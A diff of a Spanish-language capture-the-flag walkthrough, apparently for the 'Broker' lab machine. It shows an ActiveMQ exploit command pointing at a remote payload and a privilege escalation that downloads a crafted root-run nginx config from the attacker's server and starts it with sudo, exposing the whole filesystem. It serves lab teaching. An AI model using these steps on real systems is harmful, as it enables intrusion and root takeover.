@@ -147,5 +147,62 @@ go run main.go -i 10.10.11.243 -p 61616 -u http://10.10.14.70:8000/poc-linux.xml
 
 **Eso demuestra que se puede ejecutar con sudo nginx.**
 
-**Ahora navegamos a la carpeta /home ,y copiamos el archivo /etc/nginx/nginx.conf a /tmp**
+**Ahora navegamos a la carpeta /home ,y copiamos el archivo /etc/nginx/nginx.conf a /tmp y debemos editarlo.**
 
+```nginx
+user root;
+worker_processes 4;
+pid /tmp/nginx.pid;
+events {
+worker_connections 768;
+}
+http {
+server {
+listen 1337;
+root /;
+autoindex on;
+dav_methods PUT;
+}
+}
+```
+
+**En mi caso yo cree el archivo en mi computadora.**
+
+```bash
+nvim pw.conf
+```
+
+**Luego abri un puerto en la mis carpeta.**
+
+```python
+python -m http.server 2000
+Serving HTTP on 0.0.0.0 port 2000 (http://0.0.0.0:2000/) ...
+10.10.11.243 - - [29/Nov/2023 16:54:10] "GET /pw.conf HTTP/1.1" 200 -
+```
+
+**Realice un wget en la carpeta /tmp de la victima.**
+
+```bash
+activemq@broker:/tmp$ wget http://10.10.16.20:2000/pw.conf
+wget http://10.10.16.20:2000/pw.conf
+--2023-11-29 16:56:24--  http://10.10.16.20:2000/pw.conf
+Connecting to 10.10.16.20:2000... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 158 [text/plain]
+Saving to: ‘pw.conf’
+
+     0K                                                       100% 13.6M=0s
+
+2023-11-29 16:56:28 (13.6 MB/s) - ‘pw.conf’ saved [158/158]
+```
+
+**Active nginx pasando en pw.conf.**
+
+```bash
+activemq@broker:/tmp$ sudo nginx -c /tmp/pw.conf
+sudo nginx -c /tmp/pw.conf
+```
+
+**Luego realice el curl para leer el contenido root.txt ultima bandera.**
+
+<figure><img src="../../../.gitbook/assets/Ultima.png" alt=""><figcaption></figcaption></figure>
